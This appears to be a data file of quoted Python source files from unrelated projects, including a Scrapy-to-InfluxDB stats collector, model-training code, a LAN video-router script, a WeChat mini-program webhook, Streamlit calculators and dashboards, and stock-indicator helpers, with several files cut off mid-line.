    "from datetime import datetime\n\nfrom influxdb_client_3 import InfluxDBClient3, Point\nfrom scrapy import Spider\nfrom scrapy.crawler import Crawler\nfrom scrapy.settings import Settings\nfrom scrapy.statscollectors import StatsCollector, StatsT\n\nfrom .exceptions import SettingMissingError\n\n\nclass InfluxDBStatsCollector(StatsCollector):\n    def __init__(self, crawler: Crawler) -> None:\n        super().__init__(crawler)\n\n        self._parse_settings(crawler.settings)\n        self._init_client()\n\n    def _init_client(self) -> None:\n        self.client = InfluxDBClient3(\n            host=self.influxdb_host,\n            org=self.influxdb_org,\n            database=self.influxdb_database,\n            token=self.influxdb_token,\n        )\n\n    def _parse_settings(self, settings: Settings) -> None:\n        influxdb_database = settings.get(\"INFLUXDB_DATABASE\")\n\n        if influxdb_database is None:\n            raise SettingMissingError(\"INFLUXDB_DATABASE\")\n\n        self.influxdb_database = influxdb_database\n\n        influxdb_host = settings.get(\"INFLUXDB_HOST\")\n\n        if influxdb_host is None:\n            raise SettingMissingError(\"INFLUXDB_HOST\")\n\n        self.influxdb_host = influxdb_host\n\n        influxdb_measurement_name = settings.get(\"INFLUXDB_MEASUREMENT_NAME\")\n\n        if influxdb_measurement_name is None:\n            raise SettingMissingError(\"INFLUXDB_MEASUREMENT_NAME\")\n\n        self.influxdb_measurement_name = influxdb_measurement_name\n\n        influxdb_org = settings.get(\"INFLUXDB_ORG\")\n\n        if influxdb_org is None:\n            raise SettingMissingError(\"INFLUXDB_ORG\")\n\n        self.influxdb_org = influxdb_org\n\n        influxdb_token = settings.get(\"INFLUXDB_TOKEN\")\n\n        if influxdb_token is None:\n            raise SettingMissingError(\"INFLUXDB_TOKEN\")\n\n        self.influxdb_token = influxdb_token\n\n    def _persist_stats(self, stats: StatsT, spider: Spider) -> None:\n        point = Point(self.influxdb_measurement_name).tag(\"spider_name\", spider.name)\n\n        for key, value in stats.items():\n            if isinstance(value, datetime):\n                value = value.timestamp()  # noqa: PLW2901\n\n            point = point.field(key, value)\n\n        self.client.write(point)\n",
    "\"\"\"\nCopyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n\nLicensed under the Apache License, Version 2.0 (the \"License\").\nYou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\"\"\"\n\nimport math\nimport os\n\nimport pytorch_lightning as pl\nimport torch\nfrom optimizer_utils import build_optimizer\nfrom pytorch_lightning.callbacks import BasePredictionWriter\nfrom scheduler_utils import build_scheduler\nfrom timm.utils import accuracy\nfrom torch_models import get_model\nfrom torchmetrics.utilities.data import to_onehot\nfrom train_utils import (\n    gaussian_loss_fn,\n    label_logit_and_hinge_scoring_fn,\n    pinball_loss_fn,\n    rearrange_quantile_fn,\n)\n\n# base utilities\n\n\ndef get_optimizer_params(optimizer_params):\n    \"convenience function to add default options to optimizer params if not provided\"\n    # optimizer\n    optimizer_params.setdefault(\"opt_type\", \"adamw\")\n    optimizer_params.setdefault(\"weight_decay\", 0.0)\n    optimizer_params.setdefault(\"lr\", 1e-3)\n\n    # scheduler\n    optimizer_params.setdefault(\"scheduler\", None)\n    # optimizer_params.setdefault('min_factor', 1.)\n    optimizer_params.setdefault(\"epochs\", 100)  # needed for CosineAnnealingLR\n    optimizer_params.setdefault(\"step_gamma\", 0.1)  # decay fraction in step scheduler\n    optimizer_params.setdefault(\n        \"step_fraction\", 0.33\n    )  # fraction of total epochs before step decay\n\n    return optimizer_params\n\n\ndef get_batch(batch):\n    if len(batch) == 2:\n        samples, targets = batch\n        base_samples = samples\n    else:\n        samples, targets, base_samples = batch\n    return samples, targets, base_samples\n\n\nclass CustomWriter(BasePredictionWriter):\n    def __init__(self, output_dir, write_interval):\n        super().__init__(write_interval)\n        self.output_dir = output_dir\n\n    def write_on_epoch_end(self, trainer, pl_module, predictions, batch_indices):\n        # this will create N (num processes) files in `output_dir` each containing\n        # the predictions of it's respective rank\n        torch.save(\n            predictions,\n            os.path.join(self.output_dir, f\"predictions_{trainer.global_rank}.pt\"),\n        )\n\n\nclass LightningBaseNet(pl.LightningModule):\n    def __init__(\n        self,\n        architecture,\n        num_classes,\n        image_size=-1,\n        optimizer_params=None,\n        loss_fn=\"Crossentropy\",\n        label_smoothing=0.0,\n    ):\n        super().__init__()\n        if optimizer_params is None:\n            optimizer_params = {}\n        if loss_fn == \"Crossentropy\":\n            self.loss_fn = torch.nn.CrossEntropyLoss(label_smoothing=label_smoothing)\n        else:\n            raise NotImplementedError\n        self.optimizer_params = get_optimizer_params(optimizer_params)\n\n        self.save_hyperparameters(\n            \"architecture\", \"num_classes\", \"image_size\", \"optimizer_params\", \"loss_fn\"\n        )\n\n        self.model = get_model(architecture, num_classes, freeze_embedding=False)\n\n        self.validation_step_outputs = []\n\n    def forward(self, samples: torch.Tensor) -> torch.Tensor:\n        logits = self.model(samples)\n        return logits\n\n    def training_step(self, batch, batch_idx: int):\n        samples, targets, base_samples = get_batch(batch)\n        logits = self.forward(samples)\n        loss = self.loss_fn(logits, targets).mean()\n        acc1, acc5 = accuracy(logits, targets, topk=(1, 5))\n\n        self.log(\"ptl/loss\", loss, on_epoch=True, prog_bar=True, on_step=False)\n        self.log(\"ptl/acc1\", acc1, on_epoch=True, prog_bar=True, on_step=False)\n        self.log(\"ptl/acc5\", acc5, on_epoch=True, prog_bar=True, on_step=False)\n\n        return {\n            \"loss\": loss,\n            \"acc1\": acc1,\n            \"acc5\": acc5,\n        }\n\n    def validation_step(self, batch, batch_idx: int):\n        samples, targets, base_samples = get_batch(batch)\n\n        logits = self.forward(samples)\n        loss = self.loss_fn(logits, targets).mean()\n        acc1, acc5 = accuracy(logits, targets, topk=(1, 5))\n\n        rets = {\n            \"val_loss\": loss,\n            \"val_acc1\": acc1,\n            \"val_acc5\": acc5,\n        }\n        self.validation_step_outputs.append(rets)\n        return rets\n\n    def on_validation_epoch_end(self):\n        avg_loss = torch.stack(\n            [x[\"val_loss\"] for x in self.validation_step_outputs]\n        ).mean()\n        avg_acc1 = torch.stack(\n            [x[\"val_acc1\"] for x in self.validation_step_outputs]\n        ).mean()\n        avg_acc5 = torch.stack(\n            [x[\"val_acc5\"] for x in self.validation_step_outputs]\n        ).mean()\n        self.log(\"ptl/val_lo",
    "import requests\r\nimport time\r\n\r\ndef send_http_command(url, params):\r\n    response = requests.get(url, params=params)\r\n    if response.status_code != 200:\r\n        print(f\"Request to {url} failed with status code {response.status_code}.\")\r\n    else:\r\n        print(f\"Request to {url} was successful.\")\r\n\r\n# Normal Up NC2IO A ROUTES\r\n        \r\nurls = [\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input1_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM1 [Home]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input2_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM2 [1st]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input3_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM3 [3rd]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input4_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM4 [Outfield]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input5_video_source\", \"source_name\": \"NC1IO-BRIDGE (NC1IO (CAM5 [Talent]))\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input6_video_source\", \"source_name\": \"BIRDDOG-CROWS-NEST (CAM)\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input7_video_source\", \"source_name\": \"Black\"}),\r\n    (\"http://172.16.1.29/v1/shortcut\", {\"name\": \"input8_video_source\", \"source_name\": \"Black\"}),\r\n    \r\n    # Normal Up NC2IO B ROUTES\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input1_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (CONVO-AIDA-HD200 (BASKET-RIGHT-172.16.1.88))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input2_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM 2 1ST ))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input3_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM3 3RD))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input4_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (CAM4 OP OF))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input5_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (Cam 5 HH))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input6_video_source\", \"source_name\": \"SOFTBALL-BRIDGE (NC2IO-G-NDI2SDI (Cam 6 - NDI OF))\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input7_video_source\", \"source_name\": \"BIRDDOG-CROWS-NEST (CAM)\"}),\r\n    (\"http://172.16.1.63/v1/shortcut\", {\"name\": \"input8_video_source\", \"source_name\": \"Black\"})\r\n]\r\n\r\nfor url, params in urls:\r\n    send_http_command(url, params)\r\n    time.sleep(0.5)  # wait for 0.5 seconds",
    "import requests\nimport xmltodict\nfrom flask import Flask, request, jsonify\n\n# Flask\u5e38\u89c4\u64cd\u4f5c\napp = Flask(__name__)\n# \u5fae\u4fe1API\u7684\u5730\u5740\nWECHAT_API_URL = 'http://127.0.0.1:8888/api/'\n\n\n@app.route('/WeChatAPI', methods=['POST'])\ndef chat():\n    data = request.json\n    print(data)\n    pushType = data[\"pushType\"]  #\n    # \u4ec5\u63a5\u53d7\u7fa4\u3001\u597d\u53cb\u53d1\u9001\u7684\u5c0f\u7a0b\u5e8f\u6d88\u606f\uff0c\u5176\u4ed6\u6d88\u606f\u7c7b\u578b\u4e0d\u5904\u7406\n    # \u6d88\u606f\u7c7b\u578b\u8be6\u89c1\uff1a https://github.com/kawika-git/wechatAPI/blob/main/doc/\u5904\u7406\u6d88\u606f/\u6d88\u606f\u7c7b\u578b.md\n    if pushType != 1 or data[\"data\"]['type'] != 49:\n        return jsonify({\"success\": \"true\"})\n    xmlContent = data['data']['content']\n    if '@chatroom' in data['data']['from']:\n        # \u662f\u7fa4\u6d88\u606f\n        xmlContent = xmlContent.split(\":\\n\")[1]\n    # \u5c06xml\u8f6c\u6210json\n    xml_dict = xmltodict.parse(xmlContent)\n    miniAppConfig = xml_dict[\"msg\"][\"appmsg\"][\"weappinfo\"]\n    # \u83b7\u53d6\u5c0f\u7a0b\u5e8f\u7684appid\n    appid = miniAppConfig['appid']\n    if appid is None:\n        return jsonify({\"success\": \"true\"})\n    open_miniapp_json = {\"type\": 10106, \"appid\": appid, \"bizUserName\": miniAppConfig['username']}\n    # \u83b7\u53d6\u5c0f\u7a0b\u5e8f\u7684\u9875\u9762\u8def\u5f84\n    if 'pagepath' in miniAppConfig:\n        open_miniapp_json['pageUrl'] = miniAppConfig['pagepath']\n    # \u6253\u5f00\u5c0f\u7a0b\u5e8f\n    requests.post(WECHAT_API_URL, json=open_miniapp_json)\n    return jsonify({\"success\": \"true\"})\n\n\ndef addCallBackUrl(callBackUrl):\n    \"\"\"\n        \u8bbe\u7f6e\u56de\u8c03\u5730\u5740\uff0c\u5f53\u6709\u4eba\u53d1\u9001\u6d88\u606f\u65f6\uff0c\u5fae\u4fe1\u4f1a\u5c31\u628a\u4fe1\u606f\u53d1\u9001\u5230\u8fd9\u4e2a\u63a5\u53e3\u4e2d\n\n        \u4e3a\u4e86\u80fd\u786e\u4fdd\u8be5\u7a0b\u5e8f\u80fd\u63a5\u6536\u5230\u6d88\u606f\uff0c\u4e3a\u4e86\u4fdd\u9669\u8d77\u89c1\uff0c\u4f1a\u5148\u5c06\u4e4b\u540e\u7684\u56de\u8c03\u5730\u5740\u5220\u9664\u6389\uff0c\u518d\u8bbe\u7f6e\u65b0\u7684\u56de\u8c03\u5730\u5740\n    \"\"\"\n    # \u83b7\u53d6\u6240\u6709\u7684\u56de\u8c03\u5730\u5740\n    resdatalist = requests.post(WECHAT_API_URL, json={\"type\": 1003, }).json()[\"data\"][\"data\"]\n    # \u5220\u9664\u4e4b\u524d\u7684\u56de\u8c03\u5730\u5740\n    for item in resdatalist:\n        requests.post(WECHAT_API_URL, json={\"type\": 1002, \"cookie\": item[\"cookie\"], })\n    # \u8bbe\u7f6e\u65b0\u7684\u56de\u8c03\u5730\u5740\n    requests.post(WECHAT_API_URL, json={\"type\": 1001, \"protocol\": 2, \"url\": callBackUrl})\n\n\nif __name__ == '__main__':\n    \"\"\"\n    \u542f\u52a8python\u7684http\u670d\u52a1\uff0c\u5e76\u5c06python\u7684http\u63a5\u53e3\u5730\u5740\u8bbe\u7f6e\u4e3a\u5fae\u4fe1\u7684\u56de\u8c03\u5730\u5740\n    \u4f46\u7531\u4e8epython\u670d\u52a1\u5668\u542f\u52a8\u540e\u5c31\u4e0d\u4f1a\u518d\u6267\u884c\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u6240\u4ee5\u9700\u8981\u5148\u5c06\u5fae\u4fe1\u7684\u56de\u8c03\u5730\u5740\u8bbe\u7f6e\u4e3a\u8fd9\u4e2a\u670d\u52a1\u7684WeChatAPI\u63a5\u53e3\n    \u8bbe\u7f6e\u6210\u529f\u540e\uff0c\u518d\u542f\u52a8python\u7684http\u670d\u52a1\uff0c\u8fd9\u65f6\u5019\u5fae\u4fe1\u7684\u6240\u6709\u6d88\u606f\u90fd\u4f1a\u53d1\u9001\u5230\u8fd9\u4e2a\u670d\u52a1\u7684WeChatAPI\u63a5\u53e3\u4e2d\n    \"\"\"\n    serverPort = 18000\n    # \u7ed9\u5fae\u4fe1\u8bbe\u7f6e\u56de\u8c03\u5730\u5740\uff0c\u5f53\u6709\u4eba\u7ed9\u53d1\u9001\u6d88\u606f\u65f6\uff0c\u5fae\u4fe1\u4f1a\u5c31\u628a\u4fe1\u606f\u53d1\u9001\u5230\u8fd9\u4e2a\u63a5\u53e3\u4e2d\n    addCallBackUrl(f\"http://127.0.0.1:{serverPort}/WeChatAPI\")\n    # \u5c06\u5fae\u4fe1\u56de\u8c03\u5730\u5740\u8bbe\u7f6e\u4e3a\u8fd9\u4e2a\u670d\u52a1\u7684\u5730\u5740\n    #\n    try:\n        print(\"\u8fde\u63a5\u5fae\u4fe1\u6210\u529f\")\n    except Exception as e:\n        print(\"\u8fde\u63a5\u5fae\u4fe1\u5931\u8d25\", e)\n    app.run(host='0.0.0.0', port=serverPort)\n",
    "import streamlit as st\n\nTOTAL_SUPPLY = 21_000_000.00\nSATS_PER_BTC = 100_000_000.00\nBLOCKS_PER_YEAR = 6 * 24 * 365 # 6 blocks per hour, 24 hours per day, 365 days per year\nVBYTES_PER_BLOCK = 1_000_000\n\ndef calculate_security_cost_yearly(tx_per_year, security_budget_rate):\n    return TOTAL_SUPPLY * security_budget_rate \n\ndef calculate_cost_per_tx(security_cost, tx_per_year):\n    return security_cost / tx_per_year\n\ndef calculate_cost_in_sats(cost_per_tx, sats_per_btc):\n    return cost_per_tx * sats_per_btc\n\ndef calculate_txs_per_block(vbytes_per_tx):\n    return VBYTES_PER_BLOCK / vbytes_per_tx\n\ndef main():\n    st.title(\"Bitcoin Lightning Implications\")\n\n    st.sidebar.title(\"Parameters\")\n    price = st.sidebar.number_input(\"Bitcoin Price\", value=1_000_000.00)\n    vbytes_per_tx = st.sidebar.number_input(\"vBytes Per Average Ln Transaction\", value=164.25)\n    tx_per_year = calculate_txs_per_block(vbytes_per_tx) * BLOCKS_PER_YEAR\n    security_budget_rate = st.sidebar.slider(\"Security Budget Rate Basis Points\", value=30, min_value=1, max_value=300, step=1) / 10_000\n    logical_max_fee_to_pay = st.sidebar.slider(\"Logical Max Fee to Pay Basis Points\", value=100, min_value=1, max_value=300, step=1) / 10_000\n    average_txs_per_node_per_year = st.sidebar.slider(\"Average Txs per Node per Year\", value=1, min_value=1, max_value=10, step=1)\n    \n    st.write(\"## On-Chain Capacity\")\n    st.write(\"Bitcoin has a fixed supply of 21 million BTC. The security budget is a percentage of the total supply that must go to miners to maintain the security of the network. Currently, the security budget is set at 30 basis points, or 0.3% of the total supply. This is the cost of securing the network for a year. This assumes the subsidy is zero and the only income for miners is the transaction fees.\")\n    txs_per_block = calculate_txs_per_block(vbytes_per_tx)\n    security_cost = calculate_security_cost_yearly(tx_per_year, security_budget_rate)\n    cost_per_block = security_cost / BLOCKS_PER_YEAR\n    \n    col1, col2, col3 = st.columns(3)\n    \n    col1.metric(\"Txs Per Block\", f\"{txs_per_block:,.0f}\", \"\")\n    col2.metric(\"Security Cost Yearly\", f\"{security_cost:,.0f} BTC\", \"\")\n    col3.metric(\"Cost Per Block\", f\"{cost_per_block:,.2f} BTC\", \"\")\n\n    cost_per_tx = SATS_PER_BTC * cost_per_block / txs_per_block\n    \n    st.write(\"## Cost per Transaction\")\n    st.write(\"The cost per transaction is the cost of securing the network divided by the number of transactions per year. This is the cost of securing the network per transaction incurred by the users.\")\n    col4, col5, col6 = st.columns(3)\n    col4.metric(\"Cost Per Transaction\", f\"{cost_per_tx:,.0f} sats\", \"\")\n    col5.metric(\"Cost Per Transaction\", f\"${cost_per_tx / SATS_PER_BTC * price:,.2f}\", \"\")\n    col6.metric(\"Cost Per Transaction\", f\"{cost_per_tx / vbytes_per_tx :,.0f} sat/vB\", \"\")\n    \n    implied_channel_size =  cost_per_tx / logical_max_fee_to_pay\n    st.write(\"## Logical Channel Sizes\")\n    st.write(\"The logical channel size is based on the cost per transaction and the logical max fee to pay. This is the implied channel size that can be supported by the cost per transaction. For example no one would open a channel with a capacity of 100,000 sats if the cost per transaction is 20k sats, a 20% fee. I suspect the logical max fee to pay is around 100 basis points or 1% of the channel size.\")\n    col7, col8, col9 = st.columns(3)\n    \n    col7.metric(\"Implied Channel Size\", f\"{implied_channel_size:,.0f} sats\", \"\")\n    col8.metric(\"Implied Channel Size\", f\"${implied_channel_size / SATS_PER_BTC * price:,.0f}\", \"\")\n    col9.metric(\"Implied Channel Size\", f\"{implied_channel_size / vbytes_per_tx :,.0f} sat/vB\", \"\")\n    \n    st.write(\"## Max number of channels and nodes\")\n    st.write(\"The max number of channels and nodes is based on the total supply of bitcoin and the implied channel size. This is the maximum number of channels and nodes that can be supported by the total supply of bitcoin.\")\n    max_channels = TOTAL_SUPPLY*SATS_PER_BTC / implied_channel_size\n    st.write(f\"Max Channels: {max_channels:,.0f}\")\n    st.write(f\"Implied Number of Nodes: {max_channels / average_txs_per_node_per_year:,.0f}\")\n    \n    st.write(\"## Time required to open all channels\")\n    time_to_open_all_channels = max_channels / tx_per_year\n    st.write(f\"Time to Open All Channels: {time_to_open_all_channels:,.2f} years\")\n    \n    \n\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "# -*-coding:utf-8-*-\n\nimport itertools\nimport os\nfrom \u5b9e\u65f6\u63a5\u53e3.Ashare import *\nfrom \u5de5\u5177.MyTT import *\nimport numpy as np\nimport baostock as bs\nimport pandas as pd\nimport time\nimport warnings\nimport feather\nimport itertools as it\nfrom scipy import stats\nimport math\nimport pandas as pd\nfrom tqdm import tqdm\n# <editor-fold desc=\"\u6846\u67b6\u5de5\u5177\u51fd\u6570\">\ndef \u5408\u6210k\u7ebf\u6c42high(a, barCount):\n    barCount = int(barCount)\n    data = pd.DataFrame()\n    data[\"a\"] = a\n    max = pd.Series(data['a'].rolling(barCount).max())\n    return max.values\ndef \u5408\u6210k\u7ebf\u6c42low(a, barCount):\n    barCount = int(barCount)\n    data = pd.DataFrame()\n    data[\"a\"] = a\n    min = pd.Series(data['a'].rolling(barCount).min())\n    return min.values\ndef \u5408\u6210k\u7ebf\u6c42\u5408\u6210\u91cf\u80fd(a, barCount):\n    barCount = int(barCount)\n    data = pd.DataFrame()\n    data[\"a\"] = a\n    sum = pd.Series(data['a'].rolling(barCount).sum())\n    return sum.values\n\n\ndef barslast(\u8f93\u5165):\n    \u8f93\u5165 = np.array(\u8f93\u5165)\n    \u8f93\u5165 = (~(\u8f93\u5165.astype(bool))).astype(int)\n    # \u5f97\u5230\u8fde\u7eed\u76841\u6709\u591a\u5c11\u4e2a\n    # \u505a\u4e00\u6b21\u524d\u7f00\u548c\n    mask = np.insert(\u8f93\u5165, 0, 0)\n    sum_m = np.cumsum(mask)\n    # \u53d6\u51fa0\u7684\u4f4d\u7f6e\u7684\u503c\n    sum_0 = sum_m[mask == 0]\n    # \u8fd9\u4e9b\u4f4d\u7f6e\u7684\u503c\u53bb\u91cd\u76f8\u51cf\uff0c\u5c31\u662f\u6bcf\u4e2a\u8fde\u7eed\u76841\u7684\u6570\u91cf\n    continue1 = np.diff(np.unique(sum_0))\n    # \u628a1\u53d8\u62100\u7684\u4f4d\u7f6e\u7684\u503c\u53d8\u6210\u8fde\u7eed\u76841\u7684\u6570\u91cf\u7684\u8d1f\u6570\n    temp = \u8f93\u5165.copy()\n    position = np.where(np.diff(\u8f93\u5165) == -1)[0] + 1\n    temp[position] = -continue1\n    # \u6c42\u524d\u7f00\u548c\uff0c\u4ece1\u53d8\u62100\u65f6\uff0c\u4f1a\u81ea\u52a8\u52a0\u4e0a\u8fde\u7eed\u76841\u7684\u4e2a\u6570\u7684\u8d1f\u6570\uff0c\u5219\u81ea\u52a8\u6b63\u786e\n    \u591a\u65b9\u6301\u7eed\u65f6\u95f4 = np.cumsum(temp)\n    return \u591a\u65b9\u6301\u7eed\u65f6\u95f4\n\ndef FILTER(a,n):\n    return a\ndef CEILING(a):\n    return a\n\n\n\ndef hhv(a, n):\n    try:\n        test = pd.DataFrame()\n        test[\"a\"] = a\n        ans = test[\"a\"].rolling(n).max().values\n        return ans\n    except:\n\n        try:\n            a.tolist()\n        except:\n            1\n        try:\n            n.tolist()\n        except:\n            1\n        return np.array(maxBarslast(a, n))\n\n\ndef llv(a, n):\n    try:\n        n=int(n)\n        test = pd.DataFrame()\n        test[\"a\"] = a\n        ans = test[\"a\"].rolling(n).min().values\n        return ans\n    except:\n\n        try:\n            a.tolist()\n        except:\n            1\n        try:\n            n.tolist()\n        except:\n            1\n        return np.array(minBarslast(a,n))\n\n\n\n\n\n\n# def sma(S, N, M=1):  # \u4e2d\u56fd\u5f0f\u7684SMA,\u81f3\u5c11\u9700\u8981120\u5468\u671f\u624d\u7cbe\u786e\n#     K = pd.Series(S).rolling(N).mean()  # \u5148\u6c42\u51fa\u5e73\u5747\u503c\n#     for i in range(N + 1, len(S)):  K[i] = (M * S[i] + (N - M) * K[\n#         i - 1]) / N  # \u56e0\u4e3a\u8981\u53d6K[i-1]\uff0c\u6240\u4ee5 range(N+1, len(S))\n#     return K\ndef sma(S, N, M):  # 3\uff09\u9ad8\u6548\u5199\u6cd53\n    try:\n        return pd.Series(S).ewm(span=2 * N / M - 1, adjust=True).mean().values\n    except:\n        try:\n            try:\n                M.tolist()\n            except:\n                1\n            return SMA_M\u53d8\u52a8(S, N, M)\n        except:\n            try:\n                try:\n                    N.tolist()\n                except:\n                    1\n                return SMA_N\u53d8\u52a8(S, N, M)\n            except:\n                try:\n                    try:\n                        M.tolist()\n                    except:\n                        1\n                    try:\n                        N.tolist()\n                    except:\n                        1\n                    return SMA_\u53cc\u53d8\u52a8(S, N, M)\n                except:\n                    1\n\n\nfrom numba import jit, njit\n@jit(nopython=True)\ndef SMA_\u53cc\u53d8\u52a8(arr, n_values, m_values):\n    result = []\n    y = 0\n    n_index = 0\n    m_index = 0\n\n    for x in arr:\n        if x != x:  # Check if x is NaN (NaN values are not equal to themselves)\n            x = 0  # Replace NaN with 0\n\n        n = int(n_values[n_index])  # Get the corresponding n value for the current data point\n        n_index += 1  # Move to the next index for n_values\n\n        m = int(m_values[m_index])  # Get the corresponding m value for the current data point\n        m_index += 1  # Move to the next index for m_values\n\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n\n    return result\n\n\n@jit(nopython=True)\ndef SMA_N\u53d8\u52a8(arr, n, m_values):\n    m = int(m_values)\n    y = 0\n    result = []\n    for x, n in zip(arr, n):\n        if isinstance(x, float) and np.isnan(x):  # \u5224\u65ad\u662f\u5426\u4e3a NaN \u503c\n            x = 0  # \u66ff\u6362 NaN \u503c\u4e3a 0\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n    return result\n\n\n@jit(nopython=True)\ndef SMA_M\u53d8\u52a8(arr, n, m_values):\n    n = int(n)\n    y = 0\n    result = []\n    m_index = 0  # Initialize an index to track the current m value\n    for x in arr:\n        m = m_values[m_index] if m_index < len(m_values) else m_values[-1]  # Use last value if not enough values in m_values\n        if np.isnan(x):\n            x = np.nan_to_num(x)\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n        m_index += 1  # Move to the next m value\n    return np.array(result)\n\ndef SMA_CN(arr, n, m):\n    n = int(n)\n    m = int(m)\n    y = 0\n    result = []\n    for x in arr:\n        if np.isnan(x):\n            x = np.nan_to_num(x)\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n    return np.array(result)\n\n\n\n\ndef EMA(S, N):  # \u4e3a\u4e86\u7cbe\u5ea6 S>4*N  EMA\u81f3\u5c11\u9700\u8981120\u5468\u671f\n    try:\n        return pd.Series(S).ewm(span=N, adjust=False).m",
    "import streamlit as st\nfrom internal.intro import get_intro\nfrom internal.dns.a import get_a_record\nfrom internal.dns.aaaa import get_aaaa_record\nfrom internal.dns.cname import get_cname_record\nfrom internal.dns.mx import get_mx_record\nfrom internal.dns.ns import get_ns_record\nfrom internal.dns.txt import get_txt_record\nfrom internal.ssl.check import invoke_ssl_check\nfrom internal.m365.check import invoke_m365_check\n\nst.set_page_config(page_title=\"DNS-Toolbox\", page_icon=\"\ud83e\udd16\", layout=\"wide\")\n\n#MARK: - Pages List\npage_names_to_funcs = {\n    \"-\": get_intro,\n    \"M365 Check\": invoke_m365_check,\n    \"A Record\": get_a_record,\n    \"AAAA Record\": get_aaaa_record,\n    \"CNAME Record\": get_cname_record,\n    \"MX Record\": get_mx_record,\n    \"NS Record\": get_ns_record,\n    \"TXT Record\": get_txt_record,\n    \"SSL Check\": invoke_ssl_check,\n}\n\n\n#MARK: - Sidebar\ngo_dnstoolbox = st.sidebar.selectbox(\"Choose a function\", list(page_names_to_funcs.keys()))\ngo_dnstoolbox = go_dnstoolbox or \"-\"  # Assign a default value if go_dnstoolbox is None\npage_names_to_funcs[go_dnstoolbox]()",
    "from lxml import etree\n\nclass OSCALCatalogParser:\n    def __init__(self):\n        pass  # Assuming schema validation is handled separately or not required for parsing\n\n    def parse(self, xml_data_path):\n        ns = {'oscal': 'http://csrc.nist.gov/ns/oscal/1.0'}\n        \n        try:\n            tree = etree.parse(xml_data_path)\n            root = tree.getroot()\n\n            catalog_id = root.attrib['uuid']\n            title = root.find('oscal:metadata/oscal:title', ns).text\n            \n            controls = root.findall('.//oscal:control', ns)\n            control_details = []\n            for control in controls:\n                control_id = control.get('id')\n                control_title = control.find('oscal:title', ns).text if control.find('oscal:title', ns) is not None else \"No Title\"\n                \n                # Assuming statements are contained within 'oscal:part' elements with a 'name' attribute of 'statement'\n                statements = control.findall(\"oscal:part[@name='statement']\", ns)\n                statement_texts = []\n                for statement in statements:\n                    # Each 'oscal:part' may contain multiple 'oscal:part' elements representing different statement items\n                    parts = statement.findall(\"oscal:part\", ns)\n                    for part in parts:\n                        if part.text:\n                            statement_texts.append(part.text.strip())\n                \n                control_details.append({\n                    'id': control_id,\n                    'title': control_title,\n                    'statements': statement_texts\n                })\n\n            return {\n                'catalog_id': catalog_id,\n                'title': title,\n                'controls': control_details\n            }\n        except Exception as e:\n            print(f\"Unexpected error: {e}\")\n            return None\n",
    "import os\nimport json\nimport logging\nimport pathlib\nimport requests\nimport numpy as np\nimport pandas as pd\nimport networkx as nx\nimport streamlit as st\nfrom pyvis.network import Network\nfrom sklearn.cluster import KMeans\nfrom langchain_community.llms import Ollama\nfrom sklearn.mixture import GaussianMixture\nimport streamlit.components.v1 as components\nfrom langchain.prompts import ChatPromptTemplate\nfrom langchain_community.vectorstores import Chroma\nfrom langchain.memory import ConversationBufferMemory\nfrom sklearn.metrics.pairwise import cosine_similarity\nfrom langchain.chains import ConversationalRetrievalChain\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_experimental.text_splitter import SemanticChunker\nfrom langchain_community.embeddings import HuggingFaceInstructEmbeddings\nfrom langchain_community.document_loaders import (\n    CSVLoader,\n    PyMuPDFLoader,\n    TextLoader,\n    UnstructuredPowerPointLoader,\n    Docx2txtLoader,\n    UnstructuredExcelLoader,\n)\n\n\nFILE_LOADERS = {\n    \"csv\": CSVLoader,\n    \"docx\": Docx2txtLoader,\n    \"pdf\": PyMuPDFLoader,\n    \"pptx\": UnstructuredPowerPointLoader,\n    \"txt\": TextLoader,\n    \"xlsx\": UnstructuredExcelLoader,\n}\n\nACCEPTED_FILE_TYPES = list(FILE_LOADERS)\n\nlogger = logging.getLogger(__name__)\n\n# Message classes\nclass Message:\n    def __init__(self, content):\n        self.content = content\n\nclass HumanMessage(Message):\n    \"\"\"Represents a message from the user.\"\"\"\n    pass\n\nclass AIMessage(Message):\n    \"\"\"Represents a message from the AI.\"\"\"\n    pass\n\n@st.cache_resource\ndef load_model():\n    with st.spinner(\"Downloading Instructor XL Embeddings Model locally....please be 